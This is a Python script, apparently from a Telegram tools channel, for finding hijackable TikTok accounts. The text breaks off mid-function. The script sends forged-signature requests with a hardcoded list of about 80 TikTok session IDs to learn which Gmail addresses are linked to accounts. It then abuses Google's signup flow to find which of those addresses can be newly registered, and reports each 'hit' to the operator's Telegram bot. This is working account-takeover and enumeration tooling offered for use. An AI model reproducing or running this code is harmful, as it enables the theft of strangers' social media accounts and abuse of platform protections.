#tiktok
#telegram=toolspython2
import random
import pyfiglet

print(""""\033[2;93m ➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠𝐇𝐈𝐒𝐇𝐀𝐌𐇑 ➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠""")

Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'

logo = pyfiglet.figlet_format('Tiktok-HISHAM')
print(Z+logo)

print(""""\033[2;93m ➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠𝐇𝐈𝐒𝐇𝐀𝐌𐇑 ➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠➠""")
print()
print()
from requests import get,post as pp,Session;from urllib.parse import urlencode;import http.client,os,re,random,string,sys,time,uuid,binascii,json;from random import choice as cc,randrange as rr,randint;from time import sleep,time;import httpx;from user_agent import generate_user_agent as ggb;import telebot;from telebot import types;from uuid import uuid4;import secrets;from datetime import datetime;from bs4 import BeautifulSoup;from ms4 import InfoTik;from cfonts import render,say;from MedoSigner import Argus,Gorgon,md5,Ladon;from concurrent.futures import ThreadPoolExecutor;from threading import Thread;import binascii;import webbrowser
E='\033[1;31m';Y='\033[1;33m';Z='\033[1;31m';X='\033[1;33m';Z1='\033[2;31m';F='\033[2;32m';A='\033[2;34m';C='\033[2;35m';S='\033[2;36m';G='\033[1;34m';HH='\033[1;34m';M='\x1b[1;37m'
from requests import get,post
try:
  from urllib.parse import urlencode
except:
  os.system('pip install pycryptodome')
try:
  import MedoSigner
except:
  os.system('pip install MedoSigner')
from random import choice,randrange
import http.client
import requests
import re
from time import sleep,time
from user_agent import generate_user_agent
from random import choice,randrange
import os,re
import requests 
try:
	import telebot 
except:
	os.system('pip install telebot')
	os.system('pip install Pytelegrambotapi==3.7.7')
	os.system('clear')
	import telebot
from telebot import types
from uuid import uuid4
import random
from re import *
import json
from user_agent import generate_user_agent
import sys
from datetime import datetime
from bs4 import BeautifulSoup
import datetime
import secrets
import uuid
import binascii,sys
import secrets
try:
	import binascii
except:
	os.system('pip install binascii')
from concurrent.futures import ThreadPoolExecutor
import string
import threading
import time
from requests import get,post as pp,Session;from urllib.parse import urlencode;import http.client,os,re,random,string,sys,time,uuid,binascii,json;from random import choice as cc,randrange as rr,randint;from time import sleep,time;import httpx;from user_agent import generate_user_agent as ggb;import telebot;from telebot import types;from uuid import uuid4;import secrets;from datetime import datetime;from bs4 import BeautifulSoup;from ms4 import InfoTik;from cfonts import render,say;from MedoSigner import Argus,Gorgon,md5,Ladon;from concurrent.futures import ThreadPoolExecutor;from threading import Thread;import binascii;import webbrowser
E='\033[1;31m';Y='\033[1;33m';Z='\033[1;31m';X='\033[1;33m';Z1='\033[2;31m';F='\033[2;32m';A='\033[2;34m';C='\033[2;35m';S='\033[2;36m';G='\033[1;34m';HH='\033[1;34m';M='\x1b[1;37m'
hit,ge,be,gt,bt=0,0,0,0,0
import os

iid =input('\033[93m𝐄𝐍𝐓𝐄𝐑 𝐈𝐃 : ') 
print()
tok=input('\033[93m𝐄𝐍𝐓𝐄𝐑 𝐓𝐎𝐊𝐄𝐍: ') 


 
def luffy_info(email):
  global hit, iid, tok
  hit += 1
  email = str(email)
  user = email.split('@')[0]
  try:
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://omar-thing.nekoweb.org/',
        'Content-Type': 'application/json',
        'Origin': 'https://omar-thing.nekoweb.org',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'Priority': 'u=0',
    }
    json_data = {
        'username': user,
    }
    r = requests.post(
        'https://nodejs-serverless-function-express-ivory-ten.vercel.app/api/hello',
        headers=headers,
        json=json_data,
    ).json()
    id = r['userId']
    user = user  
    name = r['nickname']
    folon = r['stats']['following']
    folos = r['stats']['followers']
    lik = r['stats']['hearts']
    vid = r['stats']['videos']
    account_created = r['accountCreated'].split(',')[0].strip()
    nickname_modified = r['nicknameModified'].split(',')[0].strip() if r['nicknameModified'] != '' else ''
    avatar = r['avatar']
    ff = (f'''
*~ 𝗡𝗘𝗪 𝗧𝗜𝗞𝗧𝗢𝗞 𝗛𝗜𝗧 ✓
- - - - - - - - - - - - - - - - - - - - - - - - - -*
*~ 𝐇𝐢𝐭 : [* `{hit}` *]*
*~ 𝗡𝗮𝗺𝗲 : [* `{name}` *]*
*~ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : [* `{user}` *]*
*~ 𝗚𝗺𝗮𝗶𝗹 : [* `{email}@gmail.com` *]*
*~ 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀 : [* `{folos}` *]*
*~ 𝗙𝗼𝗹𝗹𝗼𝘄𝗶𝗻𝗴 : [* `{folon}` *]*
*~ 𝗟𝗜𝗞𝗘 : [* `{lik}` *]*
*~ 𝗶𝗱 : [* `{id}` *]*
*~ 𝗩𝗜𝗗𝗘𝗢 : [* `{vid}` *]*
*~ 𝗔𝗰𝗰𝗼𝘂𝗻𝘁-𝗖𝗿𝗲𝗮𝘁𝗲𝗱 : [* `{account_created}` *]*
*~ 𝗡𝗶𝗰𝗸𝗻𝗮𝗺𝗲-𝗠𝗼𝗱𝗶𝗳𝗶𝗲𝗱 : [* `{nickname_modified}` *]*
*- - - - - - - - - - - - - - - - - - - - - - - - - -*
''')
    fff = (f'''
~ 𝗡𝗘𝗪 𝗧𝗜𝗞𝗧𝗢𝗞 𝗛𝗜𝗧 ✓
- - - - - - - - - - - - - - - - - - - - - - - - - -
~ 𝐇𝐢𝐭 : [ {hit} ]
~ 𝗡𝗮𝗺𝗲 : [ {name} ]
~ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : [ {user} ]
~ 𝗚𝗺𝗮𝗶𝗹 : [ {email}@gmail.com ]
~ 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀 : [ {folos} ]
~ 𝗙𝗼𝗹𝗹𝗼𝘄𝗶𝗻𝗴 : [ {folon} ]
~ 𝗟𝗜𝗞𝗘 : [ {lik} ]
~ 𝗶𝗱 : [ {id} ]
~ 𝗩𝗜𝗗𝗘𝗢 : [ {vid} ]
~ 𝗔𝗰𝗰𝗼𝘂𝗻𝘁-𝗖𝗿𝗲𝗮𝘁𝗲𝗱 : [ {account_created} ]
~ 𝗡𝗶𝗰𝗸𝗻𝗮𝗺𝗲-𝗠𝗼𝗱𝗶𝗳𝗶𝗲𝗱 : [ {nickname_modified} ]
- - - - - - - - - - - - - - - - - - - - - - - - - -
''')
    goldkk = {'inline_keyboard': [[
                {'text': '𝗛𝗜𝗦𝗛𝗔𝗠', 'url': 'https://t.me/@Z_X0F'},
                {'text': '𝗖𝗵𝗮𝗻𝗻𝗲𝗹', 'url': 'https://t.me/toolspython2'}
            ]]}
    requests.post(f'https://api.telegram.org/bot{tok}/sendPhoto',json={'chat_id': iid,'photo': avatar,'caption': ff,'parse_mode': 'Markdown','reply_markup': json.dumps(goldkk)})
    print(fff)
  except:  
    ff = (f'''
*~ 𝗡𝗘𝗪 𝗧𝗜𝗞𝗧𝗢𝗞 𝗛𝗜𝗧 ✓
*- - - - - - - - - - - - - - - - - - - - - - - - - -*
*~ 𝐇𝐢𝐭 : [* `{hit}` *]*
*~ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : [* `{user}` *]*
*~ 𝗚𝗺𝗮𝗶𝗹 : [* `{email}@gmail.com` *]*
*- - - - - - - - - - - - - - - - - - - - - - - - - -*
''')
    fff = (f'''
~ 𝗡𝗘𝗪 𝗧𝗜𝗞𝗧𝗢𝗞 𝗛𝗜𝗧 ✓
- - - - - - - - - - - - - - - - - - - - - - - - - -
~ 𝐇𝐢𝐭 : [ {hit} ]
~ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : [ {user} ]
~ 𝗚𝗺𝗮𝗶𝗹 : [ {email}@gmail.com ]
- - - - - - - - - - - - - - - - - - - - - - - - - -
''')
    requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(ff) + "&parse_mode=Markdown")
    print(fff)
  
    
    
def vip_gmail(email): 
    global hit,ge,be,gt,bt
    if '@' in email:email=email.split('@')[0]
    if '..' in email or '_' in email or len(email) < 5 or len(email) > 30:
        return False
    name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(random.randrange(5,10)))
    birthday = random.randrange(1980,2010),random.randrange(1,12),random.randrange(1,28)
    s = requests.Session()
    headers={'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language':'en-US,en;q=0.9','referer':'https://accounts.google.com/','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36','x-browser-channel':'stable','x-browser-copyright':'Copyright 2024 Google LLC. All rights reserved.','x-browser-year':'2024'}
    params={'biz':'false','continue':'https://mail.google.com/mail/u/0/','ddm':'1','emr':'1','flowEntry':'SignUp','flowName':'GlifWebSignIn','followup':'https://mail.google.com/mail/u/0/','osid':'1','service':'mail'}
    response = s.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
    tl=response.url.split('TL=')[1]
    s1= response.text.split('"Qzxixc":"')[1].split('"')[0]
    at = response.text.split('"SNlM0e":"')[1].split('"')[0]
    headers={'accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','origin':'https://accounts.google.com','referer':'https://accounts.google.com/','user-agent':'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36','x-goog-ext-278367001-jspb':'["GlifWebSignIn"]','x-goog-ext-391502476-jspb':f'["{s1}"]','x-same-domain':'1'}
    params={'rpcids':'E815hb','source-path':'/lifecycle/steps/signup/name','hl':'en-US','TL':tl,'rt':'c'}
    data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(name,at)
    response = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers, 
        data=data,
    ).text
    headers={'accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','origin':'https://accounts.google.com','referer':'https://accounts.google.com/','user-agent':'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36','x-goog-ext-278367001-jspb':'["GlifWebSignIn"]','x-goog-ext-391502476-jspb':f'["{s1}"]','x-same-domain':'1'}
    params={'rpcids':'eOY7Bb','source-path':'/lifecycle/steps/signup/birthdaygender','hl':'en-US','TL':tl,'rt':'c'}
    data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3Cf7Nqs-sCAAZfiOnPf4iN_32KOpLfQKL0ADQBEArZ1IBDTUyai2FYax3ViMI2wqBpWShhe-OPRhpMjnm9s14Yu65MknXEBWcyTyF3Jx0pzQAAAeGdAAAAC6cBB7EATZAxrowFF7vQ68oKqx7_sdcR_u8t8CJys-8G4opCIVySwUYaUnm-BovA8aThYLISPNMc8Pl3_B0GnkQJ_W4SIed6l6EcM7QLJ8AXVNAaVgbhsnD7q4lyQnlvR14HRW10oP85EU_bwG1E4QJH1V0KnVS4mIeoqB7zHOuxMuGifv6MB3GghUGTewh0tMN1jaf8yvX804tntlrlxm3OZgCZ2UxgDjUVOKFMv1Y3Txr16jJEJ56-T7qrPCtt6H1kmUvCIl_RDZzbt_sj5OLnbX1UvVA-VgG8-X9AJdvGhCKVhkf3iSkjy6_ZKsZSbsOsMjrm7ggnLdMStIf4AzbJIyMC7q4JMCaDaW_UI9SgquR8mHMpHGRmP7zY-WE47l7uRSpkI6oV93XJZ1zskJsxaDz7sDYHpzEL1RGPnkZU45XkIkwuc1ptU_AiM6SQyoZK7wFnhYxYfDQjSwaC7lOfngr6F2e4pDWkiC96QY4xLr6m2oUoDbyKR3ykccKEECEakFKzS-wSxIt9hK6nw-a9PEpVzhf6uIywZofNCs0KJOhhtv_ReG24DOC6NHX-FweCOkiYtT2sISrm6H8Wr4E89oU_mMWtpnXmhs8PB28SXw42-EdhRPsdcQkgKycOVT_IXwCc4Td9-t7715HP-L2XLk5i05aUrk-sHPPEz8SyL3odOb1SkwQ69bRQHfbPZr858iTDD0UaYWE_Jmb4wlGxYOSsvQ3EIljWDtj69cq3slKqMQu0ZC9bdqEh0p_T9zvsVwFiZThf19JL8PtqlXH5bgoEnPqdSfYbnJviQdUTAhuBPE-O8wgmdwl22wqkndacytncjwGR9cuXqAXUk_PbS-0fJGxIwI6-b7bhD7tS2DUAJk708UK5zFDLyqN6hFtj8AAjNM-XGIEqgTavCRhPnVT0u0l7p3iwtwKmRyAn42m3SwWhOQ6LDv-K2DyLl2OKfFu9Y-fPBh-2K2hIn2tKoGMgVbBR8AsVsYL7L6Bh5JIW7LCHaXNk3oDyHDx5QFaPtMmnIxcfFG90YSEPIgWV2nb67zDDacvvCkiPEQMXHJUcz1tuivaAgCTgW68wNYkUt89KJDhJTSWY2jcPsDIyCnS-SGESyR7mvbkvC3Robo0zVQm6q3Z73si9uqJiPmUGgBLycxUq2A_L3B-Hz35vBm5Oc5Hbe8hJToB03ilQzLa8Kld5BY8_kmmh6kfrOvi07uwfusHv3mKfijE2vaK3v2O2He41hCaOv3ExSfdPKb2V5nPPTw8ryyC5ZwlM_DLCU_k5xONsh4uplpRmydmJcit4aj5Ig0qLVF9MxIWU5xoDlvhKL9jHh-HVgIe-CPp4RMM5BfTxDgtESiF97RWjwrNeKn6Fc4311AdCrfZMcZ0F2JnQsfKAz4H-hoWbrOEVBkPcBt5umJ_iaCm0cQ2XTQMjzAtfWbRe6EGSxbkK-DXBl4EQM-6cnH1139MIHLzNou_Tltbl2HaomCS044CwhRNpe95KuYhM4Fz0Z_8rRjqy48tS_L4kQMX1CtxjBNfd4eUoaAIwAcz3LaL5BwL0DAYcV3xruTTuy6X8zFHe8fAIB9pJ_Pw0YJm3Ye28_tTg5xk0R4EU7_IPIHk6RrtSsG0Rfst3Qi5NRfWFg5h9LlmlHO_EUhdw1wbCICTqbS2A94aIBSCQzn7RmqOTTSIXwgFwnSBRKvoo0v9tKQ2rnMZsXRhzQgxwfmYOq29EUbuHmmWQjpRhfzX1Z6-5gXRPr4-PjrInsTiAi36xDyc8a1yTAhKMwnvf3GNqcK8lqx80VCASvcpYxGIAFl4QghroZbIJXlhccCWVF_xrzsw83QUdoZ5ExWi5f_cLvEXeZssdtan1orOaPJuWXT_0ryzpS9fOGtT68pL4HMAPLPpfwhiZ-wtZQU0oVy6T2L6oP1SIHQDU_QDaMR0MkStXNDj69r5cTDdYZiIbFkvWYeL1afTEljx1i2n2KKnDmpJfx2HeGCSZBMKZey24z_LDLA7MyJ2VBo4Zvmm23dwhWHOly56w9ul4sWzpHqgsqmKynRoaq9SXKrrmbR3f2GKBHSvy3Jm0Ln52zwIQfFSXpOjGXq5pkOXlvQc6MPuV3zADVmcUZs6ywI-ER3PkAaA-f-zG-ke_6jvOzGp6WF8UxnIk5tq3tus_R5pUjVQFjk6qZtWOP8VZd1TeJ54Oo_ywj8YAYCphkDtFYRMZSubmnI-F9LLlAfOiDwQ7r-iNvp8psduy9xrWdIpE_l23Y_qYJPHwvtopL3lB7juqEiFkhUts7NEugyWY-m6-9oEgsOY0lM4746V-XUxSeS7UkZkQZZM19g7GkWjJ61D98i0m2u_UYLnyDFQEaIxVhFcmS1Zq7OMsKm_gYpMt4LuD1F3N__Vj05QNyI59QNQADODveiHpfVva9Cd2AzBm9AKGwU4xDS_FyX3XRsRbfQFtqNzPf1LAERHlnHFn%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(birthday[0],birthday[1],birthday[2],at)
    response = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
    ).text 
    headers={'accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','origin':'https://accounts.google.com','referer':'https://accounts.google.com/','user-agent':'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36','x-goog-ext-278367001-jspb':'["GlifWebSignIn"]','x-goog-ext-391502476-jspb':'["'+s1+'"]','x-same-domain':'1'}
    params={'rpcids':'NHJMOd','source-path':'/lifecycle/steps/signup/username','hl':'en-US','TL':tl,'rt':'c'}
    data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)
    response = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
    ).text 
    if "password"in response:
        luffy_info(email)
        os.system('cls'if os.name=="nt"else"clear")
        ge+=1
        print(f"\r  < ¦   {F} True  {HH}  {M}[{ge}] ~ {Z} False {HH}  {M}[{bt}] ~ {X} Bad mail{HH} {M}[{be}] {G} ¦ >\r") #@Z_X0F
    else:
        os.system('cls'if os.name=="nt"else"clear")
        be+=1
        print(f"\r  < ¦   {F} True  {HH}: {M}[{ge}] ~ {Z} False {HH}: {M}[{bt}] ~ {X} Bad mail{HH}: {M}[{be}] {G} ¦ >\r")    #@Z_X0F
        
        
        
        

def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int =2, platform: int = 19, unix: int = None):
    x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload is not None else None
    if not unix:
        unix = int(time())
    return Gorgon(params, unix, payload, cookie).get_value() | {
        "x-ladon": Ladon.encrypt(unix, license_id, aid),
        "x-argus": Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid, license_id=license_id, sec_device_id=sec_device_id, sdk_version=sdk_version_str, sdk_version_int=sdk_version)
    }


 
        # @Z_X0F
        
def vip_priv(email):
    global a, hit, ge, be, gt, bt
    try:
        secret = secrets.token_hex(16)
        session = requests.Session()
        new_uuid = str(uuid.uuid4()).replace('-', '')   
        sid_tt = f"sid_tt={new_uuid[:16]}; "        
        session_id = [
    "223e1947ba4dd3a5f82fa1917d897f7a",
    "0a885fe15c8c1994712359c5a1cc7555",
    "fca8007324a5776c07a42da112c59ff1",
    "4a8dad4881c36b9561020b1eb32515eb",
    "68de21fd7493d0db66727df1dc29c0a9",
    "43043e1132c01dd954e41369de999ec7",
    "4e126c28af12ecbde3f48970c0f66288",
    "ea00f8405ce1946cf9a8c4d04e0dec0a",
    "88c024610ed4bf8ceb37cc92e78b4438",
    "ee85a38eeab7505c1be356cf45324356",
    "7d42cdd76100de69c05b466d0bba1e41",
    "4d11b056afddc31ec72deddad2326765",
    "749882bed2a69157e5157bf2c4a718f2",
    "30514372833cc1b571f8dc8a0f55db94",
    "11fbbcffb0525d52bc394389f24a936b",
    "2b37fd4151b4eaf7196f5f5e7e659f64",
    "204a946b3606b5dc5986eb3828e261cd",
    "f6e7f6e669a689a4433acd46eace2cb1",
    "4c5fae74420dc27e119ff5eb2bf56102",
    "65586cba785fbed5f28b9626a8ef7dce",
    "f6c32b0881229967ea0e5c90635fa19e",
    "2f815f9e0c6d91e3915d5810ff42551a",
    "608e50f670227682805b6c4db9008025",
    "277641c2bd68423af3c97ee64116c9ea",
    "66d1c59fd6e49bf25ca828812805333f",
    "c8eb7eb7574311511e8b476ea0f5087f",
    "4bb1079bdd4d7461e49e9d7ca4bc9d62",
    "32df03aa0a45104c29c0eb241bfaf052",
    "8efef9a8fc0bad95cb399251f513cab0",
    "c4392269a5de973a130c1d8659efcc17",
    "da2fbb565878a4f97d51e0763087c29a",
    "5e4e1267e08331d25ed7012d84f78243",
    "fef15837eef02f1ebd56523240dd5be0",
    "6b6146ea2ef09ce006fdd4748aa78ffc",
    "1b9867aa336e42deceb19d7bbf045bfe",
    "d8f6f9558e1807a1cd083f13de997693",
    "7b3692b7a53eeb9b4286c2c3a60cb817",
    "fc1f9672a6d4177993114198414be131",
    "b2874922a4fbc3bcc4863724e612a013",
    "871319a3e34f2034d5204f3e9d3fc9bc",
    "d0900ba89c1a62c7334db51b90d08046",
    "f2ebd1a84b6891d9881cb18ec880be93",
    "8d04f1fc7d786b955be5a34ae9b2f32f",
    "e1f1b7e764da963f9d0dfbc2f8c811fb",
    "be5d43022279aae0fbb2810645e3a655",
    "c3b41475865dd21e2a42be682cbbeec7",
    "66d7dfdc2e9b88feb5529ab5f7922f5d",
    "135f419063215fc9ff89d8875e7364e9",
    "d93155afde179fac47815722a8988fab",
    "ab47913dc08abeb336556e9418449995",
    "3686a9458f6af84138fbb2fd9f4ffda0",
    "69e966f5519d4a6dbdd9ddfb1be4e56b",
    "df9f5cef1f2d05757af659235150e5a6",
    "f7e3313f4225c0bdf1ce635e80938a44",
    "6f7a25ed7db6c0620d7d4b1a1779813d",
    "9416f6a642f49960466e1033ac78ddf7",
    "497a97f73536f4f24831bebfed672258",
    "b4452e44aeef216e7c2b4b314b550362",
    "8892125f848d982437c383008b6c718f",
    "a2565be92f23e9dc59d7b0232fd33e54",
    "33f76bc3344b6f362a57ce3d0a76a132",
    "8f68c10b8a60b64e8d2dd3fcb1cdc6be",
    "6805b2b6487750f8a9ed74661eca0a18",
    "10b30da78a13e426e7c2f2019195fb07",
    "9fddad156790a04d6dc9f6e150d7cc5e",
    "de296140fdf052974d313dffaeac39a8",
    "ecbce30174a3109533e8c9db2b400e9f",
    "befcea68deff3c0877b5f632281d0e5c",
    "78cd438e41a1be9f27434a7ecb45d1f6",
    "2b5abd2c94b5e57fa57d2d792fcd958b",
    "46bfa28933895ace05a96a0ba0608476",
    "5e1078840499161441c8a8ca40295fb1",
    "d2906ee6e5024de40be103e937e66bb1",
    "686a259b53d792a96eb099e6326536f3",
    "c5913e6c105f88b19e4a6da96225b0a5",
    "0a0fef60a9c37390453fd0a2f5eae084",
    "fe087743cb83b87fe511c4dcc2b54b9e",
    "336a32fd882ea7a9a209f5f6f1001aec",
    "ac8cdd63d992feda7eb1be63cd5d3cbe",
    "982f6703ac3aa4473f607ffc74e7d1bd",
    "68a1c964a389536ff7a506f53b957085",
    "611254e09febca06d81e7f4ee9acf739",
    "994be4fc2df6c999579844375cc4eb05"
]
        sessionid = random.choice(session_id)
        cookies={"passport_csrf_token":secret,"passport_csrf_token_default":secret,"sessionid":sessionid}      
        session.cookies.update(cookies)
        params={'passport-sdk-version':"6030790",'iid':str(random.randint(1,10**19)),'device_id':str(random.randint(1,10**19)),'ac':"WIFI",'channel':"googleplay",'aid':"1233",'app_name':"musical_ly",'version_code':"360505",'version_name':"36.5.5",'device_platform':"android",'os':"android"}
        mkk = sign(params=urlencode(params), payload="", cookie="")
        headers={'User-Agent':'com.zhiliaoapp.musically/2023208030(Linux;U;Android9;en;G011A;Build/PI;tt-ok/3.12.13.4-tiktok)','x-tt-passport-csrf-token':secret,'content-type':"application/x-www-form-urlencoded;charset=UTF-8",'x-argus':mkk["x-argus"],'x-gorgon':mkk["x-gorgon"],'x-khronos':mkk["x-khronos"],'x-ladon':mkk["x-ladon"]}
        response = session.post("https://api22-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/", params=params, headers=headers, data={"email": email})
        if "Email is linked to another account. Unlink or try another email" in response.text:
            vip_gmail(email)
            print(response.text)
            os.system('cls' if os.name == 'nt' else 'clear')
            gt += 1
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            bt += 1
            print(f"\r   < ¦  {F} True  {HH}  {M}[{ge}] ~ {Z} Faels {HH}  {M}[{bt}] ~ {X} Bad mail {HH}  {M}[{be}] {G} {F} ¦ >\r")
    except ValueError:
        print(f"#فصل الانترنت") 
    except requests.RequestException as e:
        print(f" فصل الانترنت") 
        
        
        
       
               
                
                 
                   
def luffy_shelby():
        while True:
            try:
                g=choice(
            [
                'azertyuiopmlkjhgfdsqwxcvbn', 
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',  
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                'abcdefghijklmnopqrstuvwxyzñ',  
                'abcdefghijklmnopqrstuvwxyzñ',
                'abcdefghijklmnopqrstuvwxyzñ',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',  
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',  
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',  
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん', 
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
                'אבגדהוזחטיכלמנסעפצקרשת',
                'אבגדהוזחטיכלמנסעפצקרשת',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'αβγδεζηθικλμνξοπρστυφχψω',  
                'αβγδεζηθικλμνξοπρστυφχψω',
                'abcdefghijklmnopqrstuvwxyzç', 
                'abcdefghijklmnopqrstuvwxyzç',
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',  
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',  
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',
            ]

        )

                keyword=''.join((choice(g) for i in range(randrange(4,9))))
                idd6= "".join(random.choice('1234567890')for i in range(19))
               
                he3 = {"User-Agent": f'com.zhiliaoapp.musically/{keyword} (Linux; U; Android {randrange(7,13)}; ar_IQ_#u-nu-latn; ANY-LX2; Build/{keyword}; Cronet/58.0.{randrange(3,9)}.0)'}
                ttwid=requests.get('https://www.tiktok.com/',headers=he3).cookies.get_dict()['ttwid']
